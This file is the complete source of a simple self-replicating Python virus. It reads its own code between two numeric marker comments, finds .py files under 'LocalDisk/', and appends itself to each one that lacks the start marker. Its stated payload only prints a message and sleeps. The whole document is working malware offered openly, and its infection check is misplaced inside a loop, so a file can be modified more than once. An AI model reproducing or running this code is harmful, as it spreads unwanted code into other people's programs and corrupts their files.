#200004577
#Signature ID - Python code injection 

import sys, re, glob, time
virusCode = []

# open file and read all lines
# filter out lines that aren't in code boundary

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()


inVirus = False  #Initiliaze
for line in lines:
    if (re.search("^#200004577", line)):
        inVirus = True
        # Start appending to the list from the start of the virus 
    
    if (inVirus == True):
        virusCode.append(line)

    if (re.search("^#200004578", line)): #200004578 indicated end of the project
        break # End


# Find victims to infect with the virus
# glob is used for searching of files
programsToInfect = glob.glob("LocalDisk/*.py")

#start infecting
for program in programsToInfect:
    newFile = open(program,"r")
    programLines = newFile.readlines()
    newFile.close()
    
    #Virus already on file?
    infected = False 
    for line in programLines:
        if(re.search("^#200004577",line)):
            infected = True
            break
            #Already Infected
        
        if (infected == False):
            newCodeInfected = programLines
            newCodeInfected.extend(virusCode)

            File = open(program,"w")
            File.writelines(newCodeInfected)
            File.close()

#payload (Problem that virus will cause)
print(" VIRUS INFECTED FILE \n")

time.sleep(10)

#200004578